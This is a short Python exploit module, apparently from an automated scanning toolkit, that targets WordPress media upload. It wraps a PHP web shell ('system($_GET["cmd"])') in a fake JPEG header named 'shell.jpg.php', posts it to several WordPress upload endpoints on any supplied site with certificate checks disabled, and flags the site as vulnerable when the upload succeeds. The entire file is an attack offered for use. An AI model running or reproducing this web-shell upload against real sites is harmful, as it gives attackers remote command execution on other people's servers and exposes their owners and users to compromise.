import requests
from core.printmodels import *
import base64

class WordPress_Media_RCE_2024:
    def __init__(self):
        self.name = "WordPress Media RCE 2024"
        self.description = "WordPress Media Library Remote Code Execution"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'X-HTTP-Method-Override': 'PUT'
            }

            # Malicious image with PHP payload
            php_payload = '<?php system($_GET["cmd"]); ?>'
            payload = b'\xFF\xD8\xFF\xE0' + php_payload.encode() + b'\x00\x00'

            files = {
                'async-upload': ('shell.jpg.php', payload, 'image/jpeg'),
                'name': ('shell.jpg.php', 'shell.jpg.php'),
                'action': ('', 'upload-attachment')
            }

            endpoints = [
                f"{site}/wp-admin/async-upload.php",
                f"{site}/wp-admin/admin-ajax.php?action=upload-attachment",
                f"{site}/wp-content/uploads/"
            ]

            for endpoint in endpoints:
                response = requests.post(endpoint, headers=headers, files=files, verify=False, timeout=10)
                if response.status_code == 200 and ('attachment_id' in response.text or 'success' in response.text.lower()):
                    return PrintSuccess(f"[WP-Media-2024] Vulnerable! File upload successful at {endpoint}")

            return PrintFailed("[WP-Media-2024] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[WP-Media-2024] Error: {str(e)}")
